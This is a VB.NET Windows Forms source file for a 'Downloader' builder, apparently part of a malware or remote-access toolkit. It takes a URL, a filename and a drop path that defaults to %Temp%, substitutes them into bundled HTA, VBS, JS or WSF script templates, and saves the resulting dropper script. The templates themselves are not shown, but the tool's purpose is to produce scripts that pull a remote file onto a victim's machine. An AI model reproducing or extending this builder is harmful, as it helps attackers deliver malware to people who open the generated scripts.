Public Class Downloader
    Private Sub Downloader_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ComboBox1.Text = "%Temp%"
        ComboBox2.Text = "hta"
        Server.updater()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            Dim out As String = ComboBox2.Text

            Dim stb As String
            If out = "hta" Then
                stb = My.Resources.HTA
            End If
            If out = "vbs" Then
                stb = My.Resources.vbs
            End If
            If out = "js" Then
                stb = My.Resources.js
            End If
            If out = "wsf" Then
                stb = My.Resources.wsf
            End If

            stb = stb.Replace("%url%", TextBox1.Text)
            stb = stb.Replace("%filename%", TextBox2.Text)
            stb = stb.Replace("%pathh%", ComboBox1.Text)

            SaveFileDialog1.Filter = "(*." + out + ")|*." + out
            SaveFileDialog1.FileName = "Downloader"
            If SaveFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK _
            Then
                Dim objWriter As New System.IO.StreamWriter(SaveFileDialog1.FileName, False)
                objWriter.WriteLine(stb)
                objWriter.Close()
                MessageBox.Show(SaveFileDialog1.FileName, "DONE!")
                Me.Hide()
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub
End Class